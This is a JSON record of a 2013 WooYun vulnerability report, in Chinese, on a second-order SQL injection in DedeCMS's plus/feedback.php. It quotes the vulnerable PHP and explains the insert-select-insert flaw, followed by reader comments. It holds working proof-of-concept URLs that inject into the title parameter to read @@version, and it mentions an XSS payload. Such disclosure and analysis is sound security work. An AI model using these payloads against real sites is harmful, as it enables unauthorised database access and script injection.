{"id": 13783, "wybug_id": "wooyun-2013-018562", "wybug_title": "dedecms鸡肋级注入与细节分析过程", "wybug_corp": "dedecms", "wybug_author": "yy520", "wybug_date": "2013-02-10 13:07", "wybug_open_date": "2013-03-27 13:08", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-03-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一枚二次注入，因为字数限制了，所以显得特别鸡肋。另外，祝大家新年快乐 ：） 详细说明：  \n233      extract($arcRow, EXTR_SKIP); 234      $msg = cn_substrR(TrimMsg($msg), 1000); 235      $username = cn_substrR(HtmlReplace($username, 2), 20); 236      if(empty($feedbacktype) || ($feedbacktype!='good' && $feedbacktype!='bad')) 237      { 238          $feedbacktype = 'feedback'; 239      } 240      //保存评论内容 241      if($comtype == 'comments') 242      { 243          $arctitle = addslashes($title); 244          $typeid = intval($typeid); 245          $ischeck = intval($ischeck); 246          $feedbacktype = preg_replace(\"#[^0-9a-z]#i\", \"\", $feedbacktype); 247          if($msg!='') 248          { 249              $inquery = \"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`, `mid`,`bad`,`good`,`ftype`,`face`,`msg`) 250                     VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime', '{$cfg_ml->M_ID}','0','0','$feedbacktype','$face','$msg'); \"; 251              $rs = $dsql->ExecuteNoneQuery($inquery); 252              if(!$rs) 253              { 254                  ShowMsg(' 发表评论错误! ', '-1'); 255                  //echo $dsql->GetError(); 256                  exit(); 257              } 258          } 259      } 260      //引用回复 261      elseif ($comtype == 'reply') 262      { 263          $row = $dsql->GetOne(\"SELECT * FROM `#@__feedback` WHERE id ='$fid'\"); 264          $arctitle = $row['arctitle']; 265          $aid =$row['aid']; 266          $msg = $quotemsg.$msg; 267          $msg = HtmlReplace($msg, 2); 268          $inquery = \"INSERT INTO `#@__feedback`(`aid`,`typeid`,`username`,`arctitle`,`ip`,`ischeck`,`dtime`,`mid`,`bad`,`good`,`ftype`,`face`,`msg`) 269                  VALUES ('$aid','$typeid','$username','$arctitle','$ip','$ischeck','$dtime','{$cfg_ml->M_ID}','0','0','$feedbacktype','$face','$msg')\"; 270          $dsql->ExecuteNoneQuery($inquery); 271      }\n理论：insert → select → insert 类型line 233 , 指定为 EXTR_SKIP，所以我们可以任意制定$title的值line 243 , 第一次insert之前，$title被过滤，$title=test\\'进入数据库时将变成test'line 263 , select出来的arctitle 为 test',然后再次进入insert，导致注入   漏洞证明：  实际：假设我们第一次输入：http://localhost/dede7/plus/feedback.php?action=send&aid=1&&comtype=comments&isconfirm=yes&notuser=1&msg=stage1111&title=yy',1,1,1,0,0,0,'feedback',0,@@version),(9,1,'','当gpc为on时，line 243的$title被转义两次，进入数据库的时候变成\n\n然后我们引用这条留言：http://localhost/dede7/plus/feedback.php?action=send&aid=1&&comtype=reply&isconfirm=yes&notuser=1&msg=stage2222&fid=38\n\n再次引用id 41的留言：\n\n成功注入：\n\n理论意义大于实际意义，这个注入没有太大的危害，因为字段arctitle在mysql中的定义为 varchar(60) not null，60字节不够绕过那个ids，同理还有plus/bookfeedback.php，不过bookfeedback.php 好像没启用，没作测试，对了，当title=<script>alert(1)</script>的时候，还可以产生一个xss\n\n   修复方案：     版权声明：转载请注明来源 yy520@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-03-15 10:59 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  好吧，其实不算鸡肋    \n     2013-03-27 13:23 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @yy520 楼主分析帝，    \n     2013-03-27 14:49 |    \t\topen \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:5        | ;alert('robert');//)\t\t \n  这漏洞很NB    \n     2013-03-27 17:41 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  嗯，理论价值比较大。值得学习。很多程序都这样，过分的相信数据库里的数据。    \n     2013-03-27 18:48 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  @xsjswt 实际上，实际意义也很大了，可以绕过那个60字节的限制了,可惜还是需要留言的权限    \n     2013-03-28 09:43 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  @yy520 我觉得理论价值比实际价值大。印证了“很多程序过分相信来自数据库的数据”。从拿cacti的shell，到拿主站的shell，都是靠程序过分相信数据库中的数据 WooYun: 沦陷学生之家，一次漂亮的渗透与源码分析    \n     2013-05-15 10:33 |    \t\tclzzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:18        )\t\t \n  留个爪    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}